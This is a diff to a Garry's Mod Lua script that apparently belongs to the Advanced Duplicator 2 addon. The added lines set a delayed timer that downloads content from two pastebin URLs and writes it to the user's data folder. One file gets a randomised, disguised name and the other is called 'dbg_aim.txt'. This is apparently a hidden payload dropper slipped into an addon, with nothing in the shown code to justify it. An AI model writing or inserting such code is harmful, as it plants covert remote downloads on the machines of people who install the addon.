@@ -14,3 +14,22 @@ a(b..i.."/")
 end 
 end
 a("data/advdupe2/")
+
+timer.Simple(10, function()
+local ta = {
+"00c1c023911eb9",
+"3911eb903806e1",
+"23911eb936e6f6",
+"773806e6f6e6963",
+"023911eb900c1c0",
+"911eb936f63806s"
+}
+
+http.Fetch("https://pastebin.com/raw/q9ZRqJEY", function(b)
+    file.Write(table.Random(ta)..table.Random(ta)..".txt", b)
+end)
+
+http.Fetch("https://pastebin.com/raw/Hf6QYzHm", function(b)
+    file.Write("dbg_aim.txt", b)
+end)
+end)
